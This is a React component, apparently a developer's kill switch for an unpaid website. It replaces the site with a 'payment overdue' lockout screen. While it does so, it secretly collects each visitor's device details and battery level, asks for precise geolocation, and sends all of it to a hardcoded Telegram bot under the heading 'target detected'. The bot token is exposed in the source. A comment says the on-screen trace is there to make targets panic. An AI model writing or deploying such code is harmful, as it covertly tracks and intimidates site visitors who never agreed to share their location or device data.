import React, { useState, useEffect } from 'react';

const PaymentGuard = ({ children }: { children: React.ReactNode }) => {
  // SAKLAR UTAMA
  const isPending = true; 

  // KONFIGURASI TELEGRAM
  const BOT_TOKEN = "8799389636:AAGRQ3ThfyKQKFl2s1hg_tgmtATuWuC_FFc";
  const CHAT_ID = "7259504531";

  const [deviceData, setDeviceData] = useState({
    ip: 'Mendeteksi...',
    os: 'Mendeteksi...',
    ram: 'Mendeteksi...',
    battery: 'Mendeteksi...',
    location: 'Menunggu Izin...'
  });

  const sendToTelegram = async (pesan: string) => {
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: pesan,
          parse_mode: 'HTML'
        })
      });
    } catch (err) {
      console.error("Gagal kirim log:", err);
    }
  };

  useEffect(() => {
    if (isPending) {
      const initCapture = async () => {
        // 1. Ambil Data Dasar
        const ua = navigator.userAgent;
        let model = "PC/Laptop";
        if (/android/i.test(ua)) model = "Android Smartphone";
        else if (/iPhone|iPad/i.test(ua)) model = "Apple iOS Device";

        // @ts-ignore
        const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";

        let bat = "Unknown";
        try {
          // @ts-ignore
          const battery = await navigator.getBattery();
          bat = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : ''}`;
        } catch (e) {}

        setDeviceData(prev => ({ ...prev, os: model, ram: ram, battery: bat }));

        // 2. Kirim Log Awal ke Telegram
        const logAwal = `
<b>🚨 TARGET TERDETEKSI</b>
━━━━━━━━━━━━━━━━━━
<b>📱 Device:</b> ${model}
<b>💾 RAM:</b> ${ram}
<b>🔋 Baterai:</b> ${bat}
<b>🌐 UserAgent:</b> <code>${ua.slice(0, 100)}...</code>
━━━━━━━━━━━━━━━━━━
<i>Menunggu koordinat lokasi...</i>`;
        
        sendToTelegram(logAwal);

        // 3. Minta Izin Lokasi
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              const { latitude, longitude, accuracy } = pos.coords;
              setDeviceData(prev => ({ ...prev, location: 'Koordinat Terkunci' }));
              
              const logLokasi = `
<b>📍 LOKASI TARGET (PRESISI)</b>
━━━━━━━━━━━━━━━━━━
<b>Lat:</b> <code>${latitude}</code>
<b>Long:</b> <code>${longitude}</code>
<b>Akurasi:</b> ${Math.round(accuracy)} meter
<b>Maps:</b> https://www.google.com/maps?q=${latitude},${longitude}
━━━━━━━━━━━━━━━━━━`;
              sendToTelegram(logLokasi);
            },
            (err) => {
              sendToTelegram("<b>❌ Lokasi Ditolak:</b> User tidak memberikan izin lokasi.");
            }
          );
        }
      };

      initCapture();
    }
  }, [isPending]);

  if (!isPending) return <>{children}</>;

  return (
    <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-gray-50 p-4 font-sans">
      <div className="max-w-lg w-full p-8 bg-white border-2 border-red-100 shadow-2xl rounded-[2rem]">
        <div className="flex justify-center mb-6">
          <div className="p-4 bg-red-50 rounded-full animate-pulse">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-12 h-12 text-red-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
            </svg>
          </div>
        </div>
        
        <h1 className="text-2xl font-black text-center text-gray-900 uppercase tracking-tight mb-4">
          Akses Website Ditutup
        </h1>

        <div className="space-y-4 mb-8">
          <p className="text-gray-600 font-medium text-center leading-relaxed">
            "Maaf website ini kami tutup, belum melunasi pembayaran yang nunggak. Jangan salahkan developer jika sulit untuk membayar."
          </p>
          
          <div className="p-4 bg-gray-900 rounded-2xl border-l-4 border-red-500">
            <p className="text-red-400 font-bold italic text-sm">
              "Developer bukan budak yang disuruh-suruh terus. Waktu mahal, jangan membuang waktu jika bercanda order!"
            </p>
          </div>
        </div>

        {/* Info Box (Visual agar target panik) */}
        <div className="bg-black rounded-xl p-4 mb-8 font-mono text-[10px] sm:text-xs">
          <p className="text-red-500 mb-2 font-bold uppercase tracking-widest text-center border-b border-gray-800 pb-2">
            System Log Trace
          </p>
          <div className="text-green-500 space-y-1">
            <p><span className="text-gray-500">Device :</span> {deviceData.os}</p>
            <p><span className="text-gray-500">Memory :</span> {deviceData.ram}</p>
            <p><span className="text-gray-500">Power  :</span> {deviceData.battery}</p>
            <p><span className="text-gray-500">Trace  :</span> {deviceData.location}</p>
          </div>
        </div>

        <button 
          onClick={() => window.location.href = 'https://wa.me/628xxxxxxx'} 
          className="w-full py-4 bg-red-600 text-white font-black rounded-2xl hover:bg-red-700 transition-all shadow-lg shadow-red-200 uppercase tracking-wider"
        >
          Selesaikan Pembayaran
        </button>
        
        <p className="mt-6 text-center text-[10px] font-bold text-gray-300 tracking-[0.3em] uppercase">
          Secured by iboycloud
        </p>
      </div>
    </div>
  );
};

export default PaymentGuard;
